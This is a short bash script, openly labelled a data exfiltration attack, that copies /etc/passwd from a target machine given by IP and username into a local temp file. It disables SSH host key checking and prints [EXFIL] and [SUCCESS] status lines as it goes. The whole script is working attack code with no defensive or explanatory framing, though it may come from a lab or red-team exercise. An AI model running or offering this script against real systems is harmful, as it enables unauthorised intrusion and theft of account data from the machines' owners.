#!/usr/bin/env bash

TARGET_IP=$1
VICTIM_USER=$2

echo "==========================================="
echo "DATA EXFILTRATION ATTACK"
echo "==========================================="

EXFIL_FILE="/tmp/exfil_passwd.txt"

echo "[INFO] Attempting to retrieve /etc/passwd from victim"

scp -o StrictHostKeyChecking=no \
${VICTIM_USER}@${TARGET_IP}:/etc/passwd \
$EXFIL_FILE 2>&1 | while read line
do
    echo "[EXFIL] $line"
done

if [ -f "$EXFIL_FILE" ]; then
    echo "[SUCCESS] Data exfiltrated"
    echo "[FILE SIZE] $(wc -l $EXFIL_FILE)"
else
    echo "[FAIL] Exfiltration failed"
fi

echo "==========================================="
echo "EXFILTRATION COMPLETE"
echo "==========================================="